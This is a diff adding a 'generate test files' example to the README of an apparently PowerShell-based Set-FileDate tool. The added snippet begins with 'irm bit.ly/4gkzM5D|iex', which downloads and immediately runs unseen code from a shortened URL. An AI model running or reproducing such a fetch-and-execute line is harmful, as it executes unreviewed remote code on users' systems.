@@ -49,3 +49,15 @@ Get-Item "test\file.txt" | Set-FileDate "2024-2-4" -All
 Get-Item "test\file.txt" | Set-FileDate "2024-02-04" -Format "yyyy-MM-dd"
 
 ```
+
+<br><br><br>
+
+生成測試檔案
+
+```ps1
+irm bit.ly/4gkzM5D|iex; 1..10 | ForEach-Object{
+  $idx=$_.ToString('00')
+  New-Item -ItemType File -Path "file_2024-02-$idx.txt" |
+  Set-FileDate "2024-02-$idx"
+}
+```
